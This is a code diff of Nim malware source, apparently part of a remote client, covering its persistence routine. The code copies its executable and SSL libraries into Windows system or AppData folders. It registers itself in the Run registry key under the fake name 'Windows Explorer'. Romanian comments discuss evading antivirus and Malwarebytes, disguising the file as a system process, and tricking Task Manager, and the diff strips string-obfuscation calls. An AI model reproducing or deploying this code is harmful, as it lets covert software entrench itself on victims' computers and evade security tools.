@@ -14,7 +14,7 @@ import ../functions/isAdmin
 from ../constants import EXE_NAME
 
 proc initPersistenceThread*(): void {.thread.} =
-  let exeName: string = d EXE_NAME
+  let exeName: string = EXE_NAME
   let filename: string = getAppFilename()
   var dest: string
 
@@ -22,10 +22,10 @@ proc initPersistenceThread*(): void {.thread.} =
     # ma detecteaza antivirusul la windows ca svchost e
     # scris cu chiril si seamana cu cv fisier windows
     # trebuie sa vad sa gasesc alt nume credibil
-    dest = getEnv(d e"SystemRoot")
+    dest = getEnv("SystemRoot")
   else:
     # ma detecteaza mallwarebytes daca stau in appdata
-    dest = getEnv(d e"appdata") / d(e("Microsoft\\Windows"))
+    dest = getEnv("appdata") / "Microsoft\\Windows"
 
   let appDest: string = dest / exeName
   # imi da crash programul daca incerc sa i dau replace dar el e deschis
@@ -33,16 +33,16 @@ proc initPersistenceThread*(): void {.thread.} =
   if filename != appDest or not existsFile appDest:
     copyFile(filename, appDest)
 
-    let ddl1Name: string = d e "libssl-1_1.dll"
+    let ddl1Name: string = "libssl-1_1.dll"
     copyFile(ddl1Name, dest / ddl1Name)
 
-    let ddl2Name: string = d e "libcrypto-1_1.dll"
+    let ddl2Name: string = "libcrypto-1_1.dll"
     copyFile(ddl2Name, dest / ddl2Name)
     ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
     ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
     setRegKey(
-      d e "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-      d e "Windows Explorer", appDest
+       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+       "Windows Explorer", appDest
     )
   # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
   #     "client bl2", dest)
